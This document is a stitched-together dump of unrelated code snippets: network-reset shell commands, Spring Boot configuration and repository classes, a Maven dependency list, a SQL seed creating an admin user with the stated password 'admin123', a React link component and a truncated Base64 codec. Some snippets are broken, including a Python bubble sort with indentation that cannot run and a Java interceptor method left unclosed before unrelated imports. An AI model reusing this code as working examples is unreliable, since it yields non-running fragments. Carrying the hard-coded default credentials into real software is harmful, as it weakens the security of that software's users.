-----------------------------------------------------------------------------------------
https://github.com/rest-assured/rest-assured/wiki/Usage

@TestExecutionListeners(MockitoTestExecutionListener.class)
private Duration loginTimeout = Duration.ofSeconds(3);
-----------------------------------------------------------------------------------------
Type netsh winsock reset and press Enter.
Type netsh int ip reset and press Enter.
Type ipconfig /release and press Enter.
Type ipconfig /renew and press Enter.
Type ipconfig /flushdns and press Enter.
-----------------------------------------------------------------------------------------
@HypermediaDisabled
-----------------------------------------------------------------------------------------
sudo systemctl restart NetworkManager.service

nmcli nm enable false
sleep 5
nmcli nm enable true 

  sudo ip link set eth0 down
  sudo ip link set eth0 up
  
  
  sudo killall NetworkManager 
  
sudo -i
( ifdown $(ifquery --list -X lo|xargs echo) && ifup $(ifquery --list -X lo|xargs echo) )&

nmcli nm enable false eth0 && nmcli nm enable true eth0
-----------------------------------------------------------------------------------------
Lifecycle: 
Before:
Given a step that is executed before each scenario 
After:
Outcome: ANY    
Given a step that is executed after each scenario regardless of outcome
Outcome: SUCCESS 
Given a step that is executed after each successful scenario
Outcome: FAILURE 
Given a step that is executed after each failed scenario
-----------------------------------------------------------------------------------------
def bubble_sort(list):
    sorted_list = list[:]
    is_sorted = False
    while is_sorted == False:
        swaps = 0
        for i in range(len(list) - 1):
        if sorted_list[i] > sorted_list[i + 1]: # swap
            temp = sorted_list[i]
            sorted_list[i] = sorted_list[i + 1]
            sorted_list[i + 1] = temp
            swaps += 1
            print(swaps)
        if swaps == 0:
        is_sorted = True
    return sorted_list

print(bubble_sort([2, 1, 3]))

function fibonacci(n,memo) {
    memo = memo || {}
    if (memo[n]) {
        return memo[n]
    }
    if (n <= 1) {
        return 1
    }
    return memo[n] = fibonacci(n - 1, memo) + fibonacci(n - 2, memo)
}
-----------------------------------------------------------------------------------------
import java.io.BufferedWriter;
import java.io.IOException;
import java.util.Set;

import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.annotation.processing.SupportedSourceVersion;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.Element;
import javax.lang.model.element.PackageElement;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import javax.tools.FileObject;

@SupportedAnnotationTypes("com.ifedorenko.sample.proc.SampleAnnotation")
@SupportedSourceVersion(SourceVersion.RELEASE_7)
public class SampleProcessor extends AbstractProcessor {

  @Override
  public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
    for (Element element : roundEnv.getElementsAnnotatedWith(SampleAnnotation.class)) {
      try {
        TypeElement cls = (TypeElement) element;
        SampleAnnotation ann = cls.getAnnotation(SampleAnnotation.class);
        PackageElement pkg = (PackageElement) cls.getEnclosingElement();
        String clsSimpleName = ann.prefix() + cls.getSimpleName();
        String pkgName = pkg.getQualifiedName().toString();
        String clsQualifiedName = pkgName + "." + clsSimpleName;
        FileObject sourceFile = processingEnv.getFiler().createSourceFile(clsQualifiedName, cls);
        try (BufferedWriter w = new BufferedWriter(sourceFile.openWriter())) {
          w.append("package ").append(pkgName).append(";");
          w.newLine();
          w.append("public class ").append(clsSimpleName);
          w.append("{}");
        }
      } catch (IOException e) {
        e.printStackTrace();
        processingEnv.getMessager().printMessage(Diagnostic.Kind.ERROR, e.getMessage(), element);
      }
    }
    return false; // not "claimed" so multiple processors can be tested
  }

}
-----------------------------------------------------------------------------------------
import java.lang.annotation.Annotation;
import java.lang.reflect.Method;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;
import java.lang.annotation.ElementType;
import java.lang.reflect.InvocationTargetException;

class AnotTest {
    public static void main(String... args) {
        AnnotationTest at = new AnnotationTest();
        for (Method m : at.getClass().getMethods()) {
           MethodXY mXY = (MethodXY)m.getAnnotation(MethodXY.class);
           if (mXY != null) {
               if (mXY.x() == 3 && mXY.y() == 2){
                   try {
                       m.invoke(at);
                   } catch (IllegalAccessException e) {
                       //do nothing;
                   } catch (InvocationTargetException o) {
                       //do nothing;
                   }
               }
           }
        }
    }
    @Retention(RetentionPolicy.RUNTIME)
    @Target(ElementType.METHOD)
    static public @interface MethodXY {
        public int x();
        public int y();
    }

    static class AnnotationTest {
        @MethodXY(x=5, y=5)
        public void myMethodA() {
            System.out.println("boo");
        }

        @MethodXY(x=3, y=2)
        public void myMethodB() {
            System.out.println("foo");
        }
    }
}
-----------------------------------------------------------------------------------------
import java.util.NoSuchElementException;
import java.util.Objects;
import java.util.function.Function;
import java.util.function.Supplier;

// Similar to Optional but can contain null value
public class Maybe<T> {
    final T value;

    final boolean hasValue;

    private Maybe(T value, boolean hasValue) {
        this.value = value;
        this.hasValue = hasValue;
    }

    public static <T> Maybe<T> just(T value) {
        return new Maybe(value, true);
    }

    public static <T> Maybe<T> nothing() {
        return new Maybe(null, false);
    }

    public boolean isJust() {
        return hasValue;
    }

    public boolean isNothing() {
        return !hasValue;
    }

    public <N> Maybe<N> map(Function<? super T, ? extends N> funct) {
        if (hasValue) {
            return new Maybe(funct.apply(value), true);
        }
        return Maybe.nothing();
    }

    public T orElse(T fallback) {
        if (hasValue) {
            return value;
        }
        return fallback;
    }

    public <X extends Throwable> T orElseThrow(Supplier<? extends X> ex) throws X {
        if (!hasValue) {
            throw ex.get();
        }
        return value;
    }

    public T get() {
        if (!hasValue) {
            throw new NoSuchElementException();
        }
        return value;
    }

    @Override
    public int hashCode() {
        int hash = 7;
        hash = 41 * hash + Objects.hashCode(this.value);
        hash = 41 * hash + (this.hasValue ? 1 : 0);
        return hash;
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final Maybe<?> other = (Maybe<?>) obj;
        if (this.hasValue != other.hasValue) {
            return false;
        }
        if (!Objects.equals(this.value, other.value)) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return "Maybe{" + "value=" + value + ", hasValue=" + hasValue + '}';
    }
}
-----------------------------------------------------------------------------------------
npm install -g @cloudflare/wrangler
wrangler config
wrangler generate hello
cd hello
wrangler subdomain world
wrangler publish
-----------------------------------------------------------------------------------------
spring.datasource.url=jdbc:derby:memory:spring-ddd-bank-db;create=true
-----------------------------------------------------------------------------------------
		<dependency>
			<groupId>org.springframework.session</groupId>
			<artifactId>spring-session-core</artifactId>
			<version>${spring-session.version}</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.data</groupId>
			<artifactId>spring-data-mongodb</artifactId>
			<exclusions>
				<exclusion>
					<groupId>org.mongodb</groupId>
					<artifactId>mongo-java-driver</artifactId>
				</exclusion>
				<exclusion>
					<groupId>org.slf4j</groupId>
					<artifactId>jcl-over-slf4j</artifactId>
				</exclusion>
			</exclusions>
		</dependency>

		<dependency>
			<groupId>org.mongodb</groupId>
			<artifactId>mongodb-driver</artifactId>
			<version>${mongo.version}</version>
			<optional>true</optional>
		</dependency>
		
		
			<dependency>
			<groupId>org.mongodb</groupId>
			<artifactId>mongodb-driver-async</artifactId>
			<version>${mongo.version}</version>
			<scope>test</scope>
		</dependency>

		<dependency>
			<groupId>org.mongodb</groupId>
			<artifactId>mongodb-driver-reactivestreams</artifactId>
			<version>${mongo-reactivestreams.version}</version>
			<scope>test</scope>
		</dependency>
		
			<dependency>
			<groupId>de.flapdoodle.embed</groupId>
			<artifactId>de.flapdoodle.embed.mongo</artifactId>
			<version>${flapdoodle.version}</version>
			<scope>test</scope>
		</dependency>
		
		
			<dependency>
			<groupId>io.projectreactor</groupId>
			<artifactId>reactor-core</artifactId>
			<optional>true</optional>
		</dependency>
-----------------------------------------------------------------------------------------
import reactor.core.publisher.Flux;

import org.springframework.data.mongodb.repository.Tailable;
import org.springframework.data.repository.reactive.ReactiveCrudRepository;

/**
 * @author Mark Paluch
 */
public interface LoginEventRepository extends ReactiveCrudRepository<LoginEvent, String> {

	@Tailable
	Flux<LoginEvent> findPeopleBy();
}

    /**
     * An intereptor that pushes the current user UserDetails object into the request as an attribute
     * named 'currentUser'.
     * 
     * @author Mark Meany
     */
    protected class UserDetailInterceptor extends HandlerInterceptorAdapter {
        @Override
        public boolean preHandle(final HttpServletRequest request, final HttpServletResponse response, final Object handler) throws Exception {
            final Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (auth != null) {
                if (!(auth instanceof AnonymousAuthenticationToken)) {
                    if (auth.getPrincipal() != null) {
                        request.setAttribute("currentUser", auth.getPrincipal());
                    }
                }
            }
            return super.preHandle(request, response, handler);

import org.springframework.boot.web.reactive.context.ReactiveWebApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.reactive.config.ViewResolverRegistry;
import org.springframework.web.reactive.config.WebFluxConfigurer;
import org.springframework.web.reactive.result.view.freemarker.FreeMarkerConfigurer;

@Configuration
public class WebConfig implements WebFluxConfigurer {

	@Bean
	public FreeMarkerConfigurer freeMarkerConfigurer(ReactiveWebApplicationContext applicationContext) {

		FreeMarkerConfigurer configurer = new FreeMarkerConfigurer();

		configurer.setTemplateLoaderPath("classpath:/templates/");
		configurer.setResourceLoader(applicationContext);

		return configurer;
	}

	@Override
	public void configureViewResolvers(ViewResolverRegistry registry) {
		registry.freeMarker();
	}
}
-----------------------------------------------------------------------------------------
import org.apache.tiles.Attribute;
import org.apache.tiles.AttributeContext;
import org.apache.tiles.preparer.ViewPreparer;
import org.apache.tiles.request.Request;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.web.servlet.view.tiles3.SpringBeanPreparerFactory;
import org.springframework.web.servlet.view.tiles3.TilesConfigurer;
import org.springframework.web.servlet.view.tiles3.TilesView;
import org.springframework.web.servlet.view.tiles3.TilesViewResolver;

/**
 * Tiles configuration.
 * 
 * References: http://docs.spring.io/spring/docs/4.0.6.RELEASE/spring-framework-reference/html/view.html#view-tiles-integrate
 * 
 * @author Mark Meany
 */
@Configuration
public class ConfigurationForTiles {

    /**
     * Initialise Tiles on application startup and identify the location of the tiles configuration file, tiles.xml.
     * 
     * @return tiles configurer
     */
    @Bean
    public TilesConfigurer tilesConfigurer() {
        final TilesConfigurer configurer = new TilesConfigurer();
        configurer.setDefinitions(new String[] { "WEB-INF/tiles/tiles.xml" });
        configurer.setCheckRefresh(true);
        
        // Provide Spring Beans as view preparers
        configurer.setPreparerFactoryClass(SpringBeanPreparerFactory.class);
        
        return configurer;
    }

    /**
     * A Tiles View Preparer that makes the authenticated user object available as an attribute called user.
     * 
     * @return
     */
    @Bean
    public UsernamePreparer usernamePreparer() {
        return new UsernamePreparer();
    }
    
    /**
     * Introduce a Tiles view resolver, this is a convenience implementation that extends URLBasedViewResolver.
     * 
     * @return tiles view resolver
     */
    @Bean
    public TilesViewResolver tilesViewResolver() {
        final TilesViewResolver resolver = new TilesViewResolver();
        resolver.setViewClass(TilesView.class);
        return resolver;
    }
    
    /**
     * A View Preparer that queries the spring security context. If it finds an authenticated user object
     * then it makes it available as a cascading attribute that can be accessed in a view thus:
     * 
     * <tiles:getAsString name="user" />
     * 
     * @author Mark Meany
     */
    protected class UsernamePreparer implements ViewPreparer {

        @Override
        public void execute(Request arg0, AttributeContext arg1) {
            Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (!(auth instanceof AnonymousAuthenticationToken)) {
                final UserDetails userDetails = (UserDetails) auth.getPrincipal();
                arg1.putAttribute("user", new Attribute("signed in as " + userDetails.getUsername()), true);
            } else {
                arg1.putAttribute("user", new Attribute("not signed in"), true);
            }
        }
    }
}
-----------------------------------------------------------------------------------------
import static org.elasticsearch.node.NodeBuilder.nodeBuilder;

import java.io.IOException;

import org.elasticsearch.client.Client;
import org.elasticsearch.client.transport.TransportClient;
import org.elasticsearch.common.settings.ImmutableSettings;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.common.transport.InetSocketTransportAddress;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.elasticsearch.core.ElasticsearchOperations;
import org.springframework.data.elasticsearch.core.ElasticsearchTemplate;
import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories;

@Configuration
@EnableElasticsearchRepositories(basePackages = "org.phstudy.sample.repository")
public class ElasticsearchConfig {
	@Bean
	ElasticsearchOperations elasticsearchTemplate() throws IOException {

		// transport client
		Settings settings = ImmutableSettings.settingsBuilder()
		        .put("cluster.name", "elasticsearch")
		        .put("username","myname")
		        .put("password","mypassword").build();
		        
		 Client client = new TransportClient(settings)
	        .addTransportAddress(new InetSocketTransportAddress("192.168.73.186", 9300));
		 
		 return new ElasticsearchTemplate(client);

		// node client
		//		return new ElasticsearchTemplate(nodeBuilder()
		//				.local(true)
		//				.settings(
		//						ImmutableSettings.settingsBuilder()
		//								.put("cluster.name", "elasticsearch")
		//								.put("username", "myname")
		//								.put("password", "mypassword").build()).node()
		//				.client());
	}
}
-----------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.rest.core.annotation.HandleAfterCreate;
import org.springframework.data.rest.core.annotation.HandleAfterDelete;
import org.springframework.data.rest.core.annotation.HandleAfterSave;
import org.springframework.data.rest.core.annotation.RepositoryEventHandler;
import org.springframework.security.acls.domain.BasePermission;
import org.springframework.security.acls.domain.GrantedAuthoritySid;
import org.springframework.security.acls.domain.PrincipalSid;

import sample.sdr.auth.bean.AbstractSecuredEntity;
import sample.sdr.auth.bean.Book;
import sample.sdr.auth.dao.SecurityACLDAO;
import sample.sdr.auth.security.SecurityUtil;

@RepositoryEventHandler(Book.class)
public class BookHandler {
	private static Logger logger = LoggerFactory.getLogger(BookHandler.class);

	@Autowired
	private SecurityACLDAO securityACLDAO;
	
	@HandleAfterCreate
	public void afterCreate(Book book) {
		logger.debug("afterCreate:{}", book.toString());
		addACL(book);
	}

	@HandleAfterSave
	public void handleAfterSave(Book book) {
		logger.debug("afterSave:{}", book.toString());
	}
	
	@HandleAfterDelete
	public void handleAfterDelete(Book book) {
		removeACL(book);
	}
	
	private void addACL(AbstractSecuredEntity type) {
		if(type != null) {
			securityACLDAO.addPermission(type, new PrincipalSid(SecurityUtil.getUsername()), BasePermission.ADMINISTRATION);
			securityACLDAO.addPermission(type, new PrincipalSid(SecurityUtil.getUsername()), BasePermission.READ);
			securityACLDAO.addPermission(type, new PrincipalSid(SecurityUtil.getUsername()), BasePermission.WRITE);
			securityACLDAO.addPermission(type, new PrincipalSid(SecurityUtil.getUsername()), BasePermission.DELETE);
		
			securityACLDAO.addPermission(type, new GrantedAuthoritySid("ROLE_ADMIN"), BasePermission.ADMINISTRATION);
		}		
	}

	private void removeACL(AbstractSecuredEntity type) {
		//TBD
	}
}


-- default admin user, pwd: admin123
INSERT INTO userentity(id, enabled, password, username) VALUES(nextval('hibernate_sequence'),'true','$2a$10$Isti6gH/65twVovOwzDz5eryiJeRv3OLPwsihq9lTcij5UG/wIiVO','admin');

INSERT INTO roleentity(id, authority) VALUES(nextval('hibernate_sequence'),'ROLE_ADMIN');

INSERT INTO userentity_roleentity(users_id, roles_id) VALUES(1,2);

import demo.constraint.UniqueSecondary;
import demo.form.secondary.SecondaryForm;
import demo.repository.secondary.SecondaryRepository;
import org.springframework.beans.factory.annotation.Autowired;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

public class UniqueSecondaryConstraintValidator implements ConstraintValidator<UniqueSecondary, String> {

	@Autowired
	private SecondaryRepository secondaryRepository;

	@Override
	public void initialize(UniqueSecondary constraintAnnotation) {
		// Nothing to do in initialize
	}

	@Override
	public boolean isValid(String value, ConstraintValidatorContext context) {
		if (value == null) {
			return false;
		}
		return secondaryRepository.findByNameIgnoreCase(value) == null;
	}

}

import demo.constraint.validator.UniquePrimaryConstraintValidator;
import org.hibernate.validator.constraints.NotEmpty;

import javax.validation.Constraint;
import javax.validation.Payload;
import java.lang.annotation.*;

@NotEmpty
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = UniquePrimaryConstraintValidator.class)
@Documented
public @interface UniquePrimary {

	String message() default "Primary already exists";

	Class<?>[] groups() default {};

	Class<? extends Payload>[] payload() default {};

}
-----------------------------------------------------------------------------------------
import React, { ReactNode } from "react";
import { makeStyles } from "@material-ui/core/styles";
import Link, { LinkProps } from "@material-ui/core/Link";
import { Link as RouterLink } from "react-navi";

const useStyles = makeStyles(theme => ({
  link: {
    marginRight: theme.spacing(1),
    cursor: "pointer"
  }
}));

interface Props {
  to: string;
  children: ReactNode;
}

function SimpleLink(props: Props) {
  const { to, children, ...restProps } = props;
  return (
    <a {...restProps} href={to}>
      {children}
    </a>
  );
}

function IconLink(props: LinkProps) {
  return (
    <Link {...props} component={RouterLink}>
      !SomeIcon
    </Link>
  );
}

export default function ButtonRouter() {
  const classes = useStyles();
  return (
    <>
      <Link className={classes.link}>Plain</Link>

      <Link className={classes.link} component={SimpleLink}>
        !Simple
      </Link>

      <Link
        className={classes.link}
        to="https://github.com"
        component={SimpleLink}
      >
        Simple
      </Link>

      <Link className={classes.link} component={RouterLink}>
        !Navi Router
      </Link>

      <Link
        className={classes.link}
        href="https://frontarm.com/navi"
        component={RouterLink}
      >
        Navi Router
      </Link>

      <IconLink />
    </>
  );
}
-----------------------------------------------------------------------------------------
import com.github.springtestdbunit.DbUnitTestExecutionListener;
import org.junit.runner.RunWith;
import org.springframework.test.annotation.DirtiesContext;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.TestExecutionListeners;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.context.support.DependencyInjectionTestExecutionListener;
import org.springframework.test.context.support.DirtiesContextTestExecutionListener;
import org.springframework.test.context.transaction.TransactionalTestExecutionListener;

/**
 * Created on 22/11/16.
 *
 * @author Reda.Housni-Alaoui
 */
@TestExecutionListeners({
  DependencyInjectionTestExecutionListener.class,
  DirtiesContextTestExecutionListener.class,
  TransactionalTestExecutionListener.class,
  DbUnitTestExecutionListener.class
})
@RunWith(SpringRunner.class)
@ContextConfiguration(classes = {DataRepositoryConfiguration.class})
@DirtiesContext
public abstract class BaseTest {

  public static final String DATASET =
      "classpath:com/cosium/spring/data/jpa/entity/graph/dataset.xml";
}
-----------------------------------------------------------------------------------------
import io.micrometer.core.instrument.Counter;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Timer;

import java.time.Duration;
import java.time.Instant;
import java.util.concurrent.CancellationException;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledThreadPoolExecutor;

/**
 * Metrics friendly {@link ScheduledThreadPoolExecutor} extension.
 */
public class MeteredScheduledThreadPoolExecutor extends ScheduledThreadPoolExecutor {
   private final String poolName;
   private final MeterRegistry meterRegistry;
   private final ThreadLocal<Instant> taskExecutionTimer = new ThreadLocal<>();

   public MeteredScheduledThreadPoolExecutor(
      String poolName,
      int corePoolSize,
      MeterRegistry meterRegistry
   ) {
      super(corePoolSize);
      this.poolName = poolName;
      this.meterRegistry = meterRegistry;
      registerGauges();
   }

   @Override
   protected void beforeExecute(Thread thread, Runnable task) {
      super.beforeExecute(thread, task);
      taskExecutionTimer.set(Instant.now());
   }

   @Override
   protected void afterExecute(Runnable task, Throwable throwable) {
      Instant start = taskExecutionTimer.get();
      Timer timer = meterRegistry.timer(meterName("task.time"));
      timer.record(Duration.between(start, Instant.now()));

      super.afterExecute(task, throwable);
      if (throwable == null && task instanceof Future<?> && ((Future<?>) task).isDone()) {
         try {
            ((Future<?>) task).get();
         } catch (CancellationException ce) {
            throwable = ce;
         } catch (ExecutionException ee) {
            throwable = ee.getCause();
         } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
         }
      }
      if (throwable != null) {
         Counter failedTasksCounter = meterRegistry.counter(meterName("failed.tasks"));
         failedTasksCounter.increment();
      } else {
         Counter successfulTasksCounter = meterRegistry.counter(meterName("successful.tasks"));
         successfulTasksCounter.increment();
      }
   }

   private void registerGauges() {
      meterRegistry.gauge(meterName("size"), this.getCorePoolSize());
      meterRegistry.gauge(meterName("active"), this.getActiveCount());
      meterRegistry.gauge(meterName("queue.size"), getQueue().size());
   }

   private String meterName(String s) {
      return "pool.scheduled." + poolName + "." + s;
   }
}

@EnableHypermediaSupport(type = { HypermediaType.HAL })

import org.springframework.hateoas.Resource;
import org.springframework.hateoas.mvc.ControllerLinkBuilder;

import sample.halforms.controller.TaskController;
import sample.halforms.model.Task;

public class TaskResource extends Resource<Task> {

	TaskResource(Task task) {
		super(task);

		add(ControllerLinkBuilder.linkTo(ControllerLinkBuilder.methodOn(TaskController.class).read(task.getId()))
				.withSelfRel());

		add(ControllerLinkBuilder
				.linkTo(ControllerLinkBuilder.methodOn(TaskController.class).edit(task.getId(), new Task()))
				.withRel("tasks"));

		add(ControllerLinkBuilder.linkTo(ControllerLinkBuilder.methodOn(TaskController.class).list())
				.withRel("previous"));

	}

}

import org.springframework.hateoas.mvc.ResourceAssemblerSupport;

import sample.halforms.controller.TaskController;
import sample.halforms.model.Task;

public class TaskResourceAssembler extends ResourceAssemblerSupport<Task, TaskResource> {

	public TaskResourceAssembler() {
		super(TaskController.class, TaskResource.class);
	}

	@Override
	public TaskResource toResource(Task task) {
		return new TaskResource(task);
	}

}

import java.util.Set;

import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.OneToMany;

import org.springframework.data.rest.core.annotation.RestResource;
import org.springframework.hateoas.core.Relation;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.fasterxml.jackson.annotation.JsonProperty;

@Entity
@Relation(value = "category", collectionRelation = "categories")
@RestResource(exported = false)
public class Category extends AbstractEntity {

	private String name;

	private String description;

	@OneToMany(mappedBy = "category", fetch = FetchType.LAZY, orphanRemoval = true)
	@JsonIgnore
	private Set<Task> tasks;

	public Category() {
	}

	@JsonCreator
	public Category(@JsonProperty("name") String name, @JsonProperty("description") String description) {
		this.name = name;
		this.description = description;
	}

	public String getDescription() {
		return description;
	}

	public void setDescription(String description) {
		this.description = description;
	}

	public Set<Task> getTasks() {
		return tasks;
	}

	public String getName() {
		return name;
	}

	public void setName(String name) {
		this.name = name;
	}

}
-----------------------------------------------------------------------------------------
import java.util.Set;

import org.springframework.data.rest.core.config.Projection;

@Projection(name = "vetWithSpecialty", types = { Vet.class })
public interface VetWithSpecialty {

	String getFirstName();

	String getLastName();

	Set<Specialty> getSpecialties();
}
-----------------------------------------------------------------------------------------
import javax.inject.Inject;
import javax.sql.DataSource;
import org.apache.commons.dbcp.BasicDataSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseBuilder;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;
import org.springframework.jndi.JndiObjectFactoryBean;

/**
 * Different configurations for different stages.
 *
 * In development stage using an embedded database to get better performance.
 *
 * In production, container managed DataSource is highly recommended.
 *
 * @author Hantsy Bai<hantsy@gmail.com>
 *
 */
@Configuration
public class DataSourceConfig {

    private static final String ENV_JDBC_PASSWORD = "jdbc.password";
    private static final String ENV_JDBC_USERNAME = "jdbc.username";
    private static final String ENV_JDBC_URL = "jdbc.url";

    @Inject
    private Environment env;

    @Bean
    @Profile("dev")
    public DataSource dataSource() {
        return new EmbeddedDatabaseBuilder()
                .setType(EmbeddedDatabaseType.H2)
                .build();
    }

    @Bean
    @Profile("staging")
    public DataSource testDataSource() {
        BasicDataSource bds = new BasicDataSource();
        bds.setDriverClassName("com.mysql.jdbc.Driver");
        bds.setUrl(env.getProperty(ENV_JDBC_URL));
        bds.setUsername(env.getProperty(ENV_JDBC_USERNAME));
        bds.setPassword(env.getProperty(ENV_JDBC_PASSWORD));
        return bds;
    }

    @Bean
    @Profile("prod")
    public DataSource prodDataSource() {
        JndiObjectFactoryBean ds = new JndiObjectFactoryBean();
        ds.setLookupOnStartup(true);
        ds.setJndiName("jdbc/postDS");
        ds.setCache(true);

        return (DataSource) ds.getObject();
    }

}

@Configuration
@EnableWebMvc
@ComponentScan(
        basePackageClasses = {Constants.class},
        useDefaultFilters = false,
        includeFilters = {
            @Filter(
                    type = FilterType.ANNOTATION,
                    value = {
                        Controller.class,
                        RestController.class,
                        ControllerAdvice.class
                    }
            )
        }
)
-----------------------------------------------------------------------------------------
/**
 * A Base 64 codec implementation.
 * 
 * @author Hanson Char
 */
class Base64Codec implements Codec {
    private static final int OFFSET_OF_a = 'a' - 26;
    private static final int OFFSET_OF_0 = '0' - 52;
    private static final int OFFSET_OF_PLUS = '+' - 62;
    private static final int OFFSET_OF_SLASH = '/' - 63;
    
    private static final int MASK_2BITS = (1 << 2) - 1;
    private static final int MASK_4BITS = (1 << 4) - 1;
    private static final int MASK_6BITS = (1 << 6) - 1;
    // Alphabet as defined at http://www.ietf.org/rfc/rfc4648.txt
    private static final byte PAD = '=';
    
    private static class LazyHolder {
        private static final byte[] DECODED = decodeTable();
        
        private static byte[] decodeTable() {
            final byte[] dest = new byte['z'+1];
            
            for (int i=0; i <= 'z'; i++) 
            {
                if (i >= 'A' && i <= 'Z')
                    dest[i] = (byte)(i - 'A');
                else if (i >= '0' && i <= '9')
                    dest[i] = (byte)(i - OFFSET_OF_0);
                else if (i == '+')
                    dest[i] = (byte)(i - OFFSET_OF_PLUS);
                else if (i == '/')
                    dest[i] = (byte)(i - OFFSET_OF_SLASH);
                else if (i >= 'a' && i <= 'z')
                    dest[i] = (byte)(i - OFFSET_OF_a);
                else 
                    dest[i] = -1;
            }
            return dest;
        }
    }

    private final byte[] ALPAHBETS;

    Base64Codec() {
        ALPAHBETS = CodecUtils.toBytesDirect("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
    }
    
    protected Base64Codec(byte[] alphabets) {
        ALPAHBETS = alphabets;
    }

    public byte[] encode(byte[] src) {
        final int num3bytes = src.length / 3;
        final int remainder = src.length % 3;
        
        if (remainder == 0)
        {
            byte[] dest = new byte[num3bytes * 4];
    
            for (int s=0,d=0; s < src.length; s+=3, d+=4)
                encode3bytes(src, s, dest, d);
            return dest;
        }
        
        byte[] dest = new byte[(num3bytes+1) * 4];
        int s=0, d=0;
        
        for (; s < src.length-remainder; s+=3, d+=4)
            encode3bytes(src, s, dest, d);
        
        switch(remainder) {
            case 1:
                encode1byte(src, s, dest, d);
                break;
            case 2:
                encode2bytes(src, s, dest, d);
                break;
        }
        return dest;
    }
    
    void encode3bytes(byte[] src, int s, byte[] dest, int d) {
        // operator precedence in descending order: >>> or <<, &, |
        byte p;
        dest[d++] = (byte)ALPAHBETS[(p=src[s++]) >>> 2 & MASK_6BITS];                         // 6 
        dest[d++] = (byte)ALPAHBETS[(p & MASK_2BITS) << 4 | (p=src[s++]) >>> 4 & MASK_4BITS]; // 2 4
        dest[d++] = (byte)ALPAHBETS[(p & MASK_4BITS) << 2 | (p=src[s]) >>> 6 & MASK_2BITS];   //   4 2
        dest[d] = (byte)ALPAHBETS[p & MASK_6BITS];                                            //     6
        return;
    }
    
    void encode2bytes(byte[] src, int s, byte[] dest, int d) {
        // operator precedence in descending order: >>> or <<, &, |
        byte p;
        dest[d++] = (byte)ALPAHBETS[(p=src[s++]) >>> 2 & MASK_6BITS];                         // 6 
        dest[d++] = (byte)ALPAHBETS[(p & MASK_2BITS) << 4 | (p=src[s]) >>> 4 & MASK_4BITS];   // 2 4
        dest[d++] = (byte)ALPAHBETS[(p & MASK_4BITS) << 2];                                   //   4
        dest[d] = PAD;
        return;
    }
    
    void encode1byte(byte[] src, int s, byte[] dest, int d) {
        // operator precedence in descending order: >>> or <<, &, |
        byte p;
        dest[d++] = (byte)ALPAHBETS[(p=src[s]) >>> 2 & MASK_6BITS];                           // 6 
        dest[d++] = (byte)ALPAHBETS[(p & MASK_2BITS) << 4];                                   // 2
        dest[d++] = PAD;
        dest[d] = PAD;
        return;
    }
    
    void decode4bytes(byte[] src, int s, byte[] dest, int d) {
        int p=0;
        // operator precedence in descending order: >>> or <<, &, |
        dest[d++] = (byte)
                    (
                        pos(src[s++]) << 2
                        | (p=pos(src[s++])) >>> 4 & MASK_2BITS
                    )
                    ;                                               // 6 2
        dest[d++] = (byte)
                    (
                        (p & MASK_4BITS) << 4 
                        | (p=pos(src[s++])) >>> 2 & MASK_4BITS
                    )
                    ;                                               //   4 4
        dest[d] = (byte)
                    (
                        (p & MASK_2BITS) << 6
                        | pos(src[s])
                    )
                    ;                                               //     2 6
        return;
    }
    
    /**
     * @param n the number of final quantum in bytes to decode into.  Ranges from 1 to 3, inclusive.
     */
    void decode1to3bytes(int n, byte[] src, int s, byte[] dest, int d) {
        int p=0;
        // operator precedence in descending order: >>> or <<, &, |
        dest[d++] = (byte)
                    (
                        pos(src[s++]) << 2
                        | (p=pos(src[s++])) >>> 4 & MASK_2BITS
                    )
                    ;                                               // 6 2
        if (n == 1) {
            CodecUtils.sanityCheckLastPos(p, MASK_4BITS);
            return;
        }
        
        dest[d++] = (byte)
                    (
                        (p & MASK_4BITS) << 4 
                        | (p=pos(src[s++])) >>> 2 & MASK_4BITS
                    )
                    ;                                               //   4 4
        if (n == 2) {
        	CodecUtils.sanityCheckLastPos(p, MASK_2BITS);
            return;
        }
        
        dest[d] = (byte)
                    (
                        (p & MASK_2BITS) << 6
                        | pos(src[s])
                    )
                    ;                                               //     2 6
